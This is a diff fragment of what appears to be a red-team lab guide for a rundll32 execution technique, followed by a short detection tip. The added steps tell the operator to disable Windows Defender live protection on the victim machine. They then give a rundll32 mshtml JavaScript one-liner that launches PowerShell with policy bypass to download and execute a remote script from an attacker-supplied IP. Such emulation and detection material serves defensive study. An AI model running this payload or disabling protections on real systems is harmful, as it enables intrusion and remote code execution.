@@ -18,16 +18,15 @@
     N
     ```
 
-3. On your beacon, run:
+3. Ensure Windows Defender Live Protection is turned off on the victim machine
+
+4. On your beacon, add the malicious IP and run:
     ```
-    
-4. Save the file with as` NoobNoob.ps1` to `/tmp` on parrot-vm
-5. Run
-	```sh
-	sudo ch
+    sharpps rundll32.exe 'javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://<IP address>/text'');")'
+    ```
 
 ## Detection Technique:
-* Investigate uses of rundll32 to start non typical processes such as cmd.exe or to access non typical dlls.
+* Investigate uses of rundll32 to start non typical processes such as cmd/powershell or to access non typical dlls.
 
 ---
 
